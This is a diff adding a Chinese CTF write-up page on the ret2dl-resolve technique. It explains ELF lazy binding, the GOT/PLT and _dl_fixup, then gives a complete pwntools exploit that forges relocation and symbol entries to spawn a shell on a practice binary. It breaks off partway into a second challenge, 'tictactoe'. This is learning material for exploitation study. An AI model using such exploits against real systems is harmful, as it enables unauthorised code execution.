@@ -1,0 +1,585 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Tag: Pwn - V1ct0r的博客</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="TriDiamond Obsidian,"> 
+    <meta name="description" content="一、前置知识：程序：hhh
+常规思路，先检查再分析逻辑：
+
+
+
+很简单，就只有堆栈不可执行的保护，一个write函数，还有一个read函数栈溢出（0x24,0x80）。
+一想到这里，思路就是栈迁移用,"> 
+    <meta name="author" content="V1ct0r"> 
+    <link rel="alternative" href="atom.xml" title="V1ct0r的博客" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
+
+    
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
+
+    
+<link rel="stylesheet" href="/css/obsidian.css">
+
+    
+<link rel="stylesheet" href="/css/ball-atom.min.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body class="loading">
+    <div class="loader">
+        <div class="la-ball-atom la-2x">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+    <span id="config-title" style="display:none">V1ct0r的博客</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div class="scrollbar gradient-bg-rev"></div>
+<div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <div class="navigation animated fadeIn fast delay-1s">
+        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="http://yoursite.com">
+        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
+        <h3 class="subtitle">dl_runtime_resolve总结</h3>
+        <div class="social">
+            <!--        <div class="like-icon">-->
+            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+            <!--        </div>-->
+            <div>
+                <div class="share">
+                    
+                        <a href="javascript:;" class="iconfont icon-share1"></a>
+                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <div class="section">
+        <div class=article-header-wrapper>
+    <div class="article-header">
+        <div class="article-cover animated fadeIn" style="
+            animation-delay: 600ms;
+            animation-duration: 1.2s;
+            background-image: 
+                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+                url(/img/cover.jpg) ">
+        </div>
+        <div class="else">
+            <p class="animated fadeInDown">
+                
+                <a href="/categories/PWN"><b>「
+                    </b>PWN<b> 」</b></a>
+                
+                January 03, 2020
+            </p>
+            <h3 class="post-title animated fadeInDown"><a href="/2020/01/03/dl_runtime_resolve%E6%80%BB%E7%BB%93/" title="dl_runtime_resolve总结" class="">dl_runtime_resolve总结</a>
+            </h3>
+            
+            <p class="post-count animated fadeInDown">
+                
+                <span>
+                    <b class="iconfont icon-text2"></b> <i>Words count</i>
+                    43k
+                </span>
+                
+                
+                <span>
+                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
+                    40 mins.
+                </span>
+                
+                
+                
+                <span id="busuanzi_container_page_pv">
+                    <b class="iconfont icon-read"></b> <i>Read count</i>
+                    <span id="busuanzi_value_page_pv">0</span>
+                </span>
+                
+            </p>
+            
+            
+            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/%E9%AB%98%E7%BA%A7%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag">高级栈溢出</a></li></ul>
+            
+        </div>
+    </div>
+</div>
+
+<div class="screen-gradient-after">
+    <div class="screen-gradient-content">
+        <div class="screen-gradient-content-inside">
+            <div class="bold-underline-links screen-gradient-sponsor">
+                <p>
+                    <span class="animated fadeIn delay-1s"></span>
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="article">
+    <div class='main'>
+        <div class="content markdown animated fadeIn">
+            <h5 id="一、前置知识："><a href="#一、前置知识：" class="headerlink" title="一、前置知识："></a>一、前置知识：</h5><p>程序：hhh</p>
+<p>常规思路，先检查再分析逻辑：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-25e2d27f5aaddb74.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><a id="more"></a></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-13d1b82caaf95185.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-16c7b1a0bc4ab01e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>很简单，就只有堆栈不可执行的保护，一个write函数，还有一个read函数栈溢出（0x24,0x80）。</p>
+<p>一想到这里，思路就是栈迁移用write先泄露libc_start_main的真实地址，再onegadget即可getshell，但是今天要学习的是不用泄露就可getshell的做法：dl_runtime_resolve</p>
+<p>做题前先了解下前置知识：随便找个程序：666分析，看到第一次调用puts函数。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-71a91801a59d38a1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>查看内存可知，就是push 0的地址，接着push 0x601008又jmp 7ffff7dee870，查看0x601008地址内存:</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-a26a7782870f5fbe.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GOT表的内容</span><br><span class="line">GOT[0]--&gt; 0x601000:0x0000000000600e28 -&gt;.dynamic的地址</span><br><span class="line">GOT[1]--&gt; 0x601008:0x00007ffff7ffe168 -&gt;link_map 此处包含链接器的标识信息</span><br><span class="line">GOT[2]--&gt; 0x601010:0x00007ffff7dee870 -&gt;_dl_runtime_resolve 动态链接器中的入口点</span><br><span class="line">GOT[3]--&gt; 0x601018:0x00000000004004a6 -&gt;&lt;puts@plt+6&gt;__gmon_start__开始地址</span><br></pre></td></tr></table></figure>
+
+<p>执行了_dl_runtime_resolve(link_map, reloc_arg）函数，它能实现把真实地址写到got表中~</p>
+<p>在此之前，先看一张图了解延迟绑定：</p>
+<p><img src="https://ctf-wiki.github.io/ctf-wiki/executable/elf/figure/lazy-plt.png" alt="img"></p>
+<p>这个图第一次调用和第二次调用的不同对比。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-0afb1f278e57711c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>这是在link_map中的数据，可以看到在178处有个0x600e28的.dynamic地址，.dynamic段的结构很经典，它的结构如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    Elf32_Sword     d_tag;</span><br><span class="line">    union &#123;</span><br><span class="line">        Elf32_Word  d_val;</span><br><span class="line">        Elf32_Addr  d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line">extern Elf32_Dyn_DYNAMIC[];</span><br></pre></td></tr></table></figure>
+
+<p>​       包含的信息有：</p>
+<ul>
+<li>依赖于哪些动态库</li>
+<li>动态符号节信息</li>
+<li>动态字符串节信息</li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-8deb6092e8cfb9df.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>这是在ida中的动态节</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-a45e1173093dd981.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>也可以用readelf -d ./666查看</p>
+<p>我们重点关注下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0000000000000006</span> (SYMTAB)             <span class="number">0x4002b8</span></span><br><span class="line"><span class="number">0x0000000000000005</span> (STRTAB)             <span class="number">0x400360</span>  </span><br><span class="line"><span class="number">0x0000000000000017</span> (JMPREL)             <span class="number">0x4003f8</span></span><br></pre></td></tr></table></figure>
+
+<p>在ida中的样子：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-f1bc08b7b5d642a4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>Elf32_sym&lt;偏移st_name，0，0，0x12…..&gt;，&lt;&gt;里面的就是对应的参数</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-6825a77e5cd64fa9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-628d021b36348c0b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>Elf32_Rel &lt;got表地址，info&gt;，&lt;&gt;里面就是参数</p>
+<p>一个一个地看看：</p>
+<p>strtab—–&gt;.dynstr(动态字符串表)，可以从dynsym的第一个参数偏移st_name得到</p>
+<p>symtab—–&gt;.dynsym(动态符号表，用来保存与动态链接相关的导入导出符号，不包括模块内部的符号，而 .symtab 则保存所有符号，包括 .dynsym 中的符号，因此一般来说，.symtab的内容多一点）</p>
+<p>这里有一点需要注意的是.dynsym<code>是运行时所需的，ELF 文件中 export/import 的符号信息全在这里。但是</code>.symtab节中存储的信息是编译时的符号信息。</p>
+<p>.dynstr节包含了动态链接的字符串。这个节以\x00作为开始和结尾，中间每个字符串也以\x00间隔。</p>
+<p>我们主要关注动态符号.dynsym中的两个成员</p>
+<ul>
+<li>st_name， 该成员保存着动态符号在 .dynstr 表（动态字符串表）中的偏移。</li>
+<li>st_value，如果这个符号被导出，这个符号保存着对应的虚拟地址。</li>
+</ul>
+<p>jmprel—–&gt;.rel.plt</p>
+<p>.rel.plt 包含了需要重定位的函数的信息，使用如下的结构，需要区分的是<code>.rel.plt</code>节是用于函数重定位，<code>.rel.dyn</code>节是用于变量重定位</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    Elf32_Addr        r_offset;//指向对应got表的指针</span><br><span class="line">    Elf32_Word       r_info;//r_info&gt;&gt;<span class="number">8</span>后得到一个下标，对应此导入符号在.dynsym中的下标</span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line">//<span class="number">32</span> 位程序只使用 Elf32_Rel</span><br><span class="line">//<span class="number">64</span> 位程序只使用 Elf32_Rela</span><br><span class="line">typedef struct &#123;</span><br><span class="line">    Elf32_Addr     r_offset;</span><br><span class="line">    Elf32_Word    r_info;</span><br><span class="line">    Elf32_Sword    r_addend;</span><br><span class="line">&#125; Elf32_Rela;</span><br></pre></td></tr></table></figure>
+
+<p>好的，可以回到dl_runtime_resolve(link_map，reloc_arg)</p>
+<p>这里的reloc_arg就是函数在.rel.plt中的偏移，就是之前push 0中的0</p>
+<p>那么我们可以知道puts函数在.rel.plt中的偏移为0（0x601080就是.rel.plt的开始地址）查看下:</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-3e198a05c321ebfe.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>接着就需要分析_dl_runtime_resolve(link_map, reloc_arg)到底干了什么，我们gdb跟进，发现在 _dl_runtime_resolve中又调用了 _dl_fixup函数:</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-14e1572c2aae7f8a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<h5 id="有可疑的-dl-fixup函数，不知道这个是干嘛的，于是向大佬学习一波，发现是绑定got真实地址的关键！"><a href="#有可疑的-dl-fixup函数，不知道这个是干嘛的，于是向大佬学习一波，发现是绑定got真实地址的关键！" class="headerlink" title="有可疑的_dl_fixup函数，不知道这个是干嘛的，于是向大佬学习一波，发现是绑定got真实地址的关键！"></a>有可疑的_dl_fixup函数，不知道这个是干嘛的，于是向大佬学习一波，发现是绑定got真实地址的关键！</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup(struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">    // 首先通过参数reloc_arg计算重定位入口，这里的JMPREL即.rel.plt，reloc_offset即reloc_arg</span><br><span class="line">    const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    // 然后通过reloc-&gt;r_info找到.dynsym中对应的条目</span><br><span class="line">    const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    // 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JUMP_SLOT=7</span><br><span class="line">    assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line">    // 接着通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址</span><br><span class="line">    result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL);</span><br><span class="line">    // value为libc基址加上要解析函数的偏移地址，也即实际地址</span><br><span class="line">    value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : 0);</span><br><span class="line">    // 最后把value写入相应的GOT表条目中</span><br><span class="line">    <span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再看看，通过重定位表项Elf32_Rel的指针，得到对应函数的r_info，r_info &gt;&gt; 8作为.dynsym的下标（这里puts是1），求出当前函数的符号表项Elf32_Sym的指针：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-3e198a05c321ebfe.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-977aa1a7b4fd4284.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>利用Elf32_Sym的指针得到对应的st_name，.dynstr + st_name即为符号名字符串指针</p>
+<p>在动态链接库查找这个函数，并且把地址赋值给.rel.plt中对应条目的r_offset：指向对应got表的指针，由此puts的got表就被写上了真实的地址</p>
+<p>赋值给GOT表后，把程序流程返回给puts</p>
+<h5 id="最核心的利用："><a href="#最核心的利用：" class="headerlink" title="最核心的利用："></a>最核心的利用：</h5><h5 id="利用fix函数，伪造reloc-arg，也就是伪造一个很大的-rel-pltoffset，使得加上去之后的地址指向我们可以控制的地方（fake-rel"><a href="#利用fix函数，伪造reloc-arg，也就是伪造一个很大的-rel-pltoffset，使得加上去之后的地址指向我们可以控制的地方（fake-rel" class="headerlink" title="利用fix函数，伪造reloc_arg，也就是伪造一个很大的.rel.pltoffset，使得加上去之后的地址指向我们可以控制的地方（fake_rel)"></a>利用fix函数，伪造reloc_arg，也就是伪造一个很大的<code>.rel.plt</code>offset，使得加上去之后的地址指向我们可以控制的地方（fake_rel)</h5><p>回到最初那题，基本利用思路：</p>
+<p>1、栈迁移到bss中</p>
+<p>2、构造fake_rel实现函数调用</p>
+<p>3、构造fake_dynsym寻找dynstr中的”system\x00”字符</p>
+<p>4、成功执行system</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./hhh'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./hhh'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">''</span>,)</span><br><span class="line">    libc = ELF(<span class="string">'./'</span>)</span><br><span class="line"></span><br><span class="line">bss = elf.bss()</span><br><span class="line">leave_ret = <span class="number">0x080483d8</span></span><br><span class="line">PLT = <span class="number">0x8048310</span></span><br><span class="line">rel_plt = <span class="number">0x80482CC</span></span><br><span class="line">elf_dynsym = <span class="number">0x80481CC</span></span><br><span class="line">elf_dynstr = <span class="number">0x804823C</span></span><br><span class="line">stack_addr = bss + <span class="number">0x300</span></span><br><span class="line">read_plt = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line">write_plt = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x24</span></span><br><span class="line">payload += p32(stack_addr)</span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(leave_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(stack_addr)</span><br><span class="line">payload += p32(<span class="number">100</span>)</span><br><span class="line">p.recvuntil(<span class="string">"input your name!\n"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#伪造dynsym地址：</span></span><br><span class="line">fake_dynsym = stack_addr + <span class="number">28</span></span><br><span class="line"><span class="comment">#hack_rel占用８位，那么payload中就有4*5 + 2*4＝28位</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_dynsym-elf_dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line"><span class="comment">#((fake_dynsym-elf_dynsym) &amp; 0xf)相当于除0x10后取余数，因为高位的数都能被0x10整除）</span></span><br><span class="line">fake_dynsym = fake_dynsym + align</span><br><span class="line"><span class="comment">#因为dynsym结构体大小为0x10,这里就是补齐了，使其能被0x10整除</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#伪造rel地址：</span></span><br><span class="line">hack_rel = stack_addr + <span class="number">20</span></span><br><span class="line">main_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">index_dynsym_addr = (fake_dynsym - elf_dynsym)/<span class="number">0x10</span><span class="comment">#能整除了，搞到它在dynsym中的下标值</span></span><br><span class="line">r_info = (index_dynsym_addr&lt;&lt;<span class="number">8</span>) | <span class="number">0x7</span> <span class="comment">#下标值和末尾的7组合还原成那个info模式</span></span><br><span class="line">hack_rel_can = p32(main_got) + p32(r_info)<span class="comment">#ida中也能看到，是rel的两个参数</span></span><br><span class="line"><span class="comment">#配置参数，main_got是为了得到libc_base,执行完了dl_runtime_resolve，会把system的真实地址填到main_got指针，也相当于改了got表~，ｒ_info是得到system的libc偏移地址,从fix函数出来就会得到system的真实地址</span></span><br><span class="line">index_offset = hack_rel - rel_plt<span class="comment">#stack_addr + 28是要放hack_reld的地址</span></span><br><span class="line">st_name = (fake_dynsym + <span class="number">0x10</span>) - elf_dynstr</span><br><span class="line"><span class="comment">#这里加0x10是因为下面的fake_dynsym的参数占用16位，才到system字符串的位置</span></span><br><span class="line">fake_dynsym_can = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"><span class="comment">#配置参数</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'aaaa'</span><span class="comment">#栈迁移要pop的ebp</span></span><br><span class="line">payload += p32(PLT)</span><br><span class="line">payload += p32(index_offset)<span class="comment">#通过偏移调用函数</span></span><br><span class="line">payload += <span class="string">'aaaa'</span><span class="comment">#下一条将要返回的指令的地址</span></span><br><span class="line">payload += p32(stack_addr + <span class="number">64</span>)<span class="comment">#函数参数,填到64处</span></span><br><span class="line">payload += hack_rel_can <span class="comment">#hack_rel的参数（占用８位）</span></span><br><span class="line">payload += <span class="string">'a'</span>*align <span class="comment">#因为align最大为16，这里就当作16位</span></span><br><span class="line">payload += fake_dynsym_can <span class="comment">#fake_dynsym的参数(占用16位)</span></span><br><span class="line">payload += <span class="string">'system\x00'</span></span><br><span class="line">payload += <span class="string">'a'</span>*(<span class="number">64</span>-len(payload))<span class="comment">#填充字符，为了到64的位置</span></span><br><span class="line">payload += <span class="string">'/bin/sh\x00'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>在gdb动态调试看下分布：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-dd5d1d16278923ac.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-f73776388c177dbb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>完美~</p>
+<p>最后检验下：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-1f0a756e32d885e3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>以上就是我对dl_runtime_reslove的总结，这种利用还是很不错的，直接一把过去，不用泄露libc~同时也对动态链接有了新的认识和理解，一举两得。</p>
+<p>听说有个好用的工具，roputils，试了下，然而我用了get不到shell，辣鸡东西，毁我青春~不用</p>
+<h3 id="题目：tictactoe"><a href="#题目：tictactoe" class="headerlink" title="题目：tictactoe"></a>题目：tictactoe</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">king@ubuntu:~/桌面/Hackme$ checksec tictactoe</span><br><span class="line">[*] <span class="string">'/home/king/\xe6\xa1\x8c\xe9\x9d\xa2/Hackme/tictactoe'</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br><span class="line">king@ubuntu:~/桌面/Hackme$</span><br></pre></td></tr></table></figure>
+
+<p>canary保护和堆栈不可执行~看看ida：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// ST14_4</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+0h] [ebp-118h]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v5; <span class="comment">// [esp+8h] [ebp-110h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">256</span>]; <span class="comment">// [esp+Ch] [ebp-10Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// [esp+10Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  fclose(<span class="built_in">stderr</span>);</span><br><span class="line">  fwrite(<span class="string">"Thanks MatthewStell for the AI, https://gist.github.com/MatthewSteel/3158579\n"</span>, <span class="number">1u</span>, <span class="number">0x4D</span>u, <span class="built_in">stderr</span>);</span><br><span class="line">  sub_80486C7(<span class="string">"  ____     ____   __   __ __   __\n"</span></span><br><span class="line">              <span class="string">" / __ \\   / __ \\  \\ \\ / / \\ \\ / /\n"</span></span><br><span class="line">              <span class="string">"| |  | | | |  | |  \\ V /   \\ V /\n"</span></span><br><span class="line">              <span class="string">"| |  | | | |  | |   &gt; &lt;     &gt; &lt;\n"</span></span><br><span class="line">              <span class="string">"| |__| | | |__| |  / . \\   / . \\\n"</span></span><br><span class="line">              <span class="string">" \\____/   \\____/  /_/ \\_\\ /_/ \\_\\\n"</span></span><br><span class="line">              <span class="string">"\n"</span></span><br><span class="line">              <span class="string">"\n"</span></span><br><span class="line">              <span class="string">"\n"</span>);</span><br><span class="line">  sub_80486C7(<span class="string">"Welcome to use AlphaToe"</span>);</span><br><span class="line">  sub_80486C7(<span class="string">"Try to beat my A.I. system"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Computer: O, You: %c\nPlay (1)st or (2)nd? "</span>, byte_804B04C);</span><br><span class="line">  <span class="keyword">if</span> ( sub_804871C() % <span class="number">2</span> == <span class="number">1</span> )</span><br><span class="line">    v0 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v0 = <span class="number">-1</span>;</span><br><span class="line">  dword_804B048 = 